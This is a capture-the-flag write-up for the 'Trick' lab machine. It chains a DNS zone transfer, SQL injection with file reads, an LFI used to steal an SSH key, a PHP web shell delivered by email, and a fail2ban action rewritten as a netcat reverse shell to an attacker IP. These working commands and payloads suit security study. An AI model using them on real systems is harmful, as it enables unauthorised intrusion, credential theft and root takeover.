+++
title = "Trick-CPTS-Prep-Box Writeups"
date = 2026-02-17T00:00:00Z
draft = false
description = "Trick is a Linux machine focusing on DNS zone transfers, SQL injection with FILE privilege, LFI exploitation, and fail2ban privilege escalation"
tags = ["CPTS", "HTB", "Trick", "CPTS Prep", "Linux", "DNS", "SQLi", "LFI", "Fail2ban"]
+++
## Executive Summary
During November 2025, a simulated penetration test was conducted against the Linux host "Trick" (`10.129.227.180`). The objective was to evaluate the security posture of the target and identify potential escalation paths to achieve root-level privileges.
The assessment successfully demonstrated a complete attack chain, moving from initial reconnaissance to full system compromise. The following key findings were identified:
- **DNS Zone Transfer Vulnerability:** The DNS server was misconfigured to allow unauthorized zone transfers, revealing internal subdomains including `preprod-payroll.trick.htb` and `preprod-marketing.trick.htb`.
- **SQL Injection in Payroll Application:** The payroll application was vulnerable to SQL injection, allowing authentication bypass and subsequent exploitation to extract data and leverage FILE privileges.
- **MySQL FILE Privilege Abuse:** The database user possessed the FILE privilege, enabling reading of sensitive system files including `/etc/passwd` and Nginx configuration files, which revealed additional attack surfaces.
- **Local File Inclusion (LFI):** The marketing subdomain contained an LFI vulnerability, which was exploited to read Michael's SSH private key and gain initial shell access.
- **Fail2ban Privilege Escalation:** The user Michael had sudo privileges to restart fail2ban and write permissions to the fail2ban action directory, allowing modification of action scripts to execute arbitrary commands as root during ban events.
**Impact:**  
This chain of exploits resulted in complete compromise of the target system. An attacker with no prior access was able to achieve root-level privileges by chaining together multiple misconfigurations including weak DNS configuration, SQL injection, and insecure fail2ban permissions.
**Recommendations:**
- **Restrict DNS Zone Transfers:** Configure DNS servers to allow zone transfers only to authorized secondary servers.
- **Parameterized Queries:** Implement prepared statements to prevent SQL injection vulnerabilities.
- **Principle of Least Privilege:** Database users should not have FILE privileges unless absolutely necessary.
- **Input Validation:** Implement proper input validation and sanitization to prevent LFI vulnerabilities.
- **Secure Fail2ban Configuration:** Restrict write permissions to fail2ban configuration directories and review sudo privileges.
## About
Trick is a Linux machine that focuses on multiple attack vectors including DNS enumeration, SQL injection with FILE privilege, LFI exploitation, and privilege escalation through fail2ban misconfiguration. The machine provides excellent learning opportunities for understanding how seemingly minor misconfigurations can be chained together for full compromise.
## Detailed Walkthrough
### Phase 1: Initial Access and Network Reconnaissance
**1. DNS Zone Transfer Enumeration**  
The assessment began with DNS enumeration to identify any subdomains associated with the target. A zone transfer attempt was performed against the DNS server.

```bash
# DNS enumeration
dig axfr trick.htb @10.129.227.180

; <<>> DiG 9.18.41-1~deb12u1-Debian <<>> axfr trick.htb @10.129.227.180
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.ht
b. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 259 msec
;; SERVER: 10.129.227.180#53(10.129.227.180) (TCP)
;; WHEN: Sat Nov 01 20:36:21 +07 2025
;; XFR size: 6 records (messages 1, bytes 231)

```
**Findings:** The DNS server was misconfigured to allow unauthorized zone transfers, revealing two interesting subdomains: `preprod-payroll.trick.htb` and `preprod-marketing.trick.htb`.

**2. Network Scanning**  
A comprehensive port scan was conducted to identify all accessible services on the target.

```bash
# Port scanning
nmap -sV -sC 10.129.227.180
Not shown: 996 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid:
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 287.18 seconds
```

**Findings:** The scan revealed open ports including SSH (22/tcp), SMTP (25/tcp), DNS (53/tcp), and HTTP (80/tcp) running nginx. The host was identified as a Debian Linux system.

### Phase 2: Web Application Enumeration

**3. Payroll Application Discovery**  
Accessing the discovered subdomain `preprod-payroll.trick.htb` revealed an employee payroll management system login page.

**4. SQL Injection Authentication Bypass**  
The login form was tested for SQL injection vulnerabilities. A simple authentication bypass payload was successful in gaining access to the application.
```bash
admin' OR '1'='1'-- -
```

**Findings:** The application was vulnerable to SQL injection, allowing unauthorized access to the admin panel. Within the panel, user credentials were discovered including the username `Enemigosss` with password `<REDACTED>`.

### Phase 3: Database Exploitation

**5. SQLMap Enumeration**  
The injection point was further analyzed using SQLMap to understand the database configuration and potential exploitation paths.

```bash
 sqlmap -r trick_ajax.txt --batch
 <snip> 
sqlmap identified the following injection point(s) with a total of 212 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=
' AND (SELECT 2218 FROM (SELECT(SLEEP(5)))BUUr) AND 'tzds'='tzds&password=
---
[22:10:27] [INFO] the back-end DBMS is MySQL
[22:10:27] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
web application technology: Nginx 1.14.2
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[22:10:32] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb'

[*] ending @ 22:10:32 /2025-11-01/

```
**Findings:** The injection was identified as a time-based blind SQLi. The current user was not a DBA, limiting certain exploitation vectors.

**6. Technique Optimization**  
To improve exploitation efficiency, SQLMap was run with specific techniques to identify additional injection types.

```bash 
❯ sqlmap -r /home/honeypoop/HTB/CPTS-Prep/Trick/05-Tools-Output/trick_ajax.txt --risk 3 --level 5 --technique=BEU --dbms=mysql --batch

<snip> 
sqlmap identified the following injection point(s) with a total of 574 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=admin
' OR NOT 9920=9920-- QwQp&password=admin

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=admin
' OR (SELECT 4566 FROM(SELECT COUNT(*),CONCAT(0x716b7a7671,(SELECT (ELT(4566=4566,1))),0x7170627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- bERz&password=admin
---
<snip> 
[*] ending @ 23:33:59 /2025-11-01/

```
**Findings:** This revealed boolean-based blind and error-based injection vectors, providing more reliable exploitation methods.

**7. Privilege Enumeration**  
The database user privileges were enumerated to determine what actions could be performed.
```bash
 sqlmap -r /home/honeypoop/HTB/CPTS-Prep/Trick/05-Tools-Output/trick_ajax.txt --risk 3 --level 5 --technique=BEU --dbms=mysql --batch --privilege
 
<snip> 

[23:34:29] [INFO] testing MySQL
[23:34:29] [INFO] confirming MySQL
[23:34:29] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.14.2
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[23:34:29] [INFO] fetching database users privileges
[23:34:30] [INFO] retrieved: ''remo'@'localhost''
[23:34:30] [INFO] retrieved: 'FILE'
database management system users privileges:
[*] 'remo'@'localhost' [1]:
    privilege: FILE

[23:34:30] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb'
[*] ending @ 23:34:30 /2025-11-01/

```
**Findings:** The database user `remo@localhost` possessed the FILE privilege, allowing read and write operations on the filesystem.


**8. File System Access**  
Leveraging the FILE privilege, sensitive system files were read to gather intelligence about the target.

```bash
 sqlmap -r /home/honeypoop/HTB/CPTS-Prep/Trick/05-Tools-Output/trick_ajax.txt --risk 3 --level 5 --technique=BEU --dbms=mysql --batch --file-read=/etc/passwd


❯ cat _etc_passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false
dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
pulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
saned:x:112:121::/var/lib/saned:/usr/sbin/nologin
colord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologin
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:118:65534::/run/sshd:/usr/sbin/nologin
postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin
bind:x:120:128::/var/cache/bind:/usr/sbin/nologin
michael:x:1001:1001::/home/michael:/bin/bash

```

```bash
 sqlmap -r /home/honeypoop/HTB/CPTS-Prep/Trick/05-Tools-Output/trick_ajax.txt --risk 3 --level 5 --technique=BEU --dbms=mysql --batch --file-read=/etc/nginx/nginx.conf
 
 cat _etc_nginx_nginx.conf
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;

events {
        worker_connections 768;
        # multi_accept on;
}

http {

        ##
        # Basic Settings
        ##

        sendfile on;
        tcp_nopush on;
        tcp_nodelay on;
        keepalive_timeout 65;
        types_hash_max_size 2048;
        # server_tokens off;

        # server_names_hash_bucket_size 64;
        # server_name_in_redirect off;

        include /etc/nginx/mime.types;
        default_type application/octet-stream;

        ##
        # SSL Settings
        ##

        ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # Dropping SSLv3, ref: POODLE
        ssl_prefer_server_ciphers on;

        ##
        # Logging Settings
        ##

        access_log /var/log/nginx/access.log;
        error_log /var/log/nginx/error.log;

        ##
        # Gzip Settings
        ##

        gzip on;

        # gzip_vary on;
        # gzip_proxied any;
        # gzip_comp_level 6;
        # gzip_buffers 16 8k;
        # gzip_http_version 1.1;
        # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;

        ##
        # Virtual Host Configs
        ##

        include /etc/nginx/conf.d/*.conf;
        include /etc/nginx/sites-enabled/*;
}


#mail {
#       # See sample authentication script at:
#       # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript
#
#       # auth_http localhost/auth.php;
#       # pop3_capabilities "TOP" "USER";
#       # imap_capabilities "IMAP4rev1" "UIDPLUS";
#
#       server {
#               listen     localhost:110;
#               protocol   pop3;
#               proxy      on;
#       }
#
#       server {
#               listen     localhost:143;
#               protocol   imap;
#               proxy      on;
#       }
#}

```

```bash 
 sqlmap -r /home/honeypoop/HTB/CPTS-Prep/Trick/05-Tools-Output/trick_ajax.txt --risk 3 --level 5 --technique=BEU --dbms=mysql --batch --file-read=/etc/nginx/sites-enabled/default
 
cat _etc_nginx_sites-enabled_default
server {
        listen 80 default_server;
        listen [::]:80 default_server;
        server_name trick.htb;
        root /var/www/html;

        index index.html index.htm index.nginx-debian.html;

        server_name _;

        location / {
                try_files $uri $uri/ =404;
        }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm.sock;
        }
}


server {
        listen 80;
        listen [::]:80;

        server_name preprod-marketing.trick.htb;

        root /var/www/market;
        index index.php;

        location / {
                try_files $uri $uri/ =404;
        }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;
        }
}

server {
        listen 80;
        listen [::]:80;

        server_name preprod-payroll.trick.htb;

        root /var/www/payroll;
        index index.php;

        location / {
                try_files $uri $uri/ =404;
        }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm.sock;
        }
}
```
**Findings:** The Nginx configuration revealed the existence of another subdomain: `preprod-marketing.trick.htb`, which was configured with a different PHP-FPM socket.


### Phase 4: LFI Discovery and Exploitation

**9. Marketing Subdomain Enumeration**  
The newly discovered marketing subdomain was accessed and analyzed for vulnerabilities. Directory fuzzing confirmed the subdomain's existence.
```bash 
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://10.129.227.180 -H "Host: preprod-FUZZ.trick.htb"  -fs 5480

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.227.180
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: preprod-FUZZ.trick.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 5480
________________________________________________

marketing               [Status: 200, Size: 9660, Words: 3007, Lines: 179, Duration: 3587ms]
:: Progress: [420/114441] :: Job [1/1] :: 17 req/sec :: Duration: [0:00:26] :: Errors: 0 ::

```

**10. LFI Vulnerability Discovery**  
The marketing site appeared to use a `page` parameter for including content. This parameter was tested for Local File Inclusion vulnerabilities.
```bash
 ffuf -u http://preprod-marketing.trick.htb/index.php\?page\=FUZZ  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -mc all -fs 0

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://preprod-marketing.trick.htb/index.php?page=FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 0
________________________________________________

....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 85ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 91ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 80ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 84ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 80ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 84ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 84ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 110ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 110ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 115ms]
....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 98ms]
....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 99ms]
....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 98ms]
....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 98ms]
....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 114ms]
....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 114ms]
....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 114ms]
....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 114ms]
....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 100ms]
....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 110ms]
:: Progress: [922/922] :: Job [1/1] :: 395 req/sec :: Duration: [0:00:02] :: Errors: 0 ::

```
**Findings:** The application was vulnerable to LFI, allowing directory traversal to read arbitrary files from the system.

**11. SSH Key Extraction**  
The LFI vulnerability was used to read Michael's SSH private key. Due to the file size, the Range header was used to retrieve the complete key.
```bash
curl -H "Range: bytes=200-1000" http://preprod-marketing.trick.htb/index.php?page=....//....//....//home/michael/.ssh/id_rsa
```

**13. User Flag Retrieval**  
Once logged in, the user flag was retrieved from Michael's home directory.
```bash
❯ chmod 600 id_rsa
❯ ssh -i id_rsa michael@10.129.227.180
Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
michael@trick:~$
cat /home/michael/user.txt



```

### Phase 5: SMTP Enumeration and Alternate Access

**14. SMTP User Verification**  
The SMTP service was probed to verify user existence and explore potential alternative access methods.

```bash
 telnet 10.129.227.180 25
Trying 10.129.227.180...
Connected to 10.129.227.180.
Escape character is '^]'.

220 debian.localdomain ESMTP Postfix (Debian/GNU)
500 5.5.2 Error: bad syntax
VRFY michael
252 2.0.0 michael

```
**Findings:** The VRFY command confirmed that the user `michael` existed on the system.

**15. PHP Payload Delivery via Email**  
A PHP web shell was sent via email to Michael's address, leveraging the LFI vulnerability to execute it.
```bash
❯  swaks --from honey --to michael --header 'Subject: Login lock' --body '<?php system($_REQUEST["cmd"]); ?>' --server 10.129.227.180
=== Trying 10.129.227.180:25...
=== Connected to 10.129.227.180.
<-  220 debian.localdomain ESMTP Postfix (Debian/GNU)
 -> EHLO parrot
<-  250-debian.localdomain
<-  250-PIPELINING
<-  250-SIZE 10240000
<-  250-VRFY
<-  250-ETRN
<-  250-STARTTLS
<-  250-ENHANCEDSTATUSCODES
<-  250-8BITMIME
<-  250-DSN
<-  250-SMTPUTF8
<-  250 CHUNKING
 -> MAIL FROM:<honey>
<-  250 2.1.0 Ok
 -> RCPT TO:<michael>
<-  250 2.1.5 Ok
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Sun, 02 Nov 2025 12:56:38 +0700
 -> To: michael
 -> From: honey
 -> Subject: Login lock
 -> Message-Id: <20251102125638.060151@parrot>
 -> X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
 ->
 -> <?php system($_REQUEST["cmd"]); ?>
 ->
 ->
 -> .
<-  250 2.0.0 Ok: queued as C2B5F4099C
 -> QUIT
<-  221 2.0.0 Bye
=== Connection closed with remote host.

❯ curl http://preprod-marketing.trick.htb/index.php\?page\=....//....//....//var/mail/michael\&cmd\=id
From honey@debian.localdomain  Sun Nov  2 06:57:02 2025
Return-Path: <honey@debian.localdomain>
X-Original-To: michael
Delivered-To: michael@debian.localdomain
Received: from parrot (unknown [10.10.16.20])
        by debian.localdomain (Postfix) with ESMTP id C2B5F4099C
        for <michael>; Sun,  2 Nov 2025 06:57:01 +0100 (CET)
Date: Sun, 02 Nov 2025 12:56:38 +0700
To: michael
From: honey
Subject: Login lock
Message-Id: <20251102125638.060151@parrot>
X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/

uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)

```


**16. Reverse Shell via Email**  
A reverse shell payload was delivered via email and triggered through the LFI, providing an alternative shell access method.


```bash
# Enumerate system information
michael@trick:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
michael@trick:~$ cat user.txt
51094eda1fc172ae6b7545ddbb0be83c
michael@trick:~$ hostname
trick
michael@trick:~$ whoami
michael
michael@trick:~$ ifconfig
-bash: ifconfig: command not found
michael@trick:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:ac:a2 brd ff:ff:ff:ff:ff:ff
    inet 10.129.227.180/16 brd 10.129.255.255 scope global dynamic eth0
       valid_lft 2693sec preferred_lft 2693sec
    inet6 dead:beef::250:56ff:feb9:aca2/64 scope global dynamic mngtmpaddr
       valid_lft 86394sec preferred_lft 14394sec
    inet6 fe80::250:56ff:feb9:aca2/64 scope link
       valid_lft forever preferred_lft forever
michael@trick:~$

```


### Phase 6: Privilege Escalation via Fail2ban

**17. Sudo Privilege Enumeration**  
Michael's sudo privileges were checked to identify potential escalation paths.
```bash
michael@trick:~$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
michael@trick:~$

```
**Findings:** Michael could restart the fail2ban service as root without a password: `(root) NOPASSWD: /etc/init.d/fail2ban restart`


**18. Writable Directory Discovery**  
The filesystem was searched for writable directories that could be leveraged for privilege escalation.
```bash 
find /etc -writable -ls 2>/dev/null
```

**Findings:** The directory `/etc/fail2ban/action.d` was writable by the `security` group, of which Michael was a member.

**19. Fail2ban Action Modification**  
The fail2ban action configuration file was copied, modified with a malicious action, and replaced.
```bash 
cp /etc/fail2ban/action.d/iptables-multiport.conf /dev/shm/
rm /etc/fail2ban/action.d/iptables-multiport.conf
vim /dev/shm/iptables-multiport.conf
```
The actionban directive was modified to execute a reverse shell:
```bash
actionban = /usr/bin/nc 10.10.16.20 4444 -e /bin/bash
```

**20. Payload Deployment**  
The modified configuration was moved back to the fail2ban directory and the service was restarted.

```bash 
mv /dev/shm/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf
sudo /etc/init.d/fail2ban restart
```


**21. Triggering the Action**  
To trigger the malicious action, SSH brute-force attempts were simulated against the target, causing fail2ban to ban the attacking IP and execute the actionban command.

```bash 
netexec ssh 10.129.227.180 -u micheal -p /usr/share/wordlist/rockyou.txt --ignore-pw-decoding
```

**22. Root Shell Acquisition**  
The reverse shell connected back as root, providing complete system compromise.

### Phase 7: Root Flag Retrieval

**23. Root Flag**  
With root access achieved, the final flag was retrieved.

```bash 
cat /root/root.txt
```

## Key Takeaways

- **DNS Security:** Always restrict zone transfers to prevent internal network enumeration.
    
- **SQL Injection Prevention:** Implement proper input validation and parameterized queries to prevent SQL injection.
    
- **Database Privileges:** Avoid granting FILE privileges to database users unless absolutely necessary.
    
- **Input Validation:** All user input, especially file inclusion parameters, must be properly validated and sanitized.
    
- **Fail2ban Hardening:** Configuration directories should have strict permissions, and sudo privileges should follow the principle of least privilege.
    
- **Defense in Depth:** Multiple layers of security are necessary as single misconfigurations can be chained together for complete compromise.
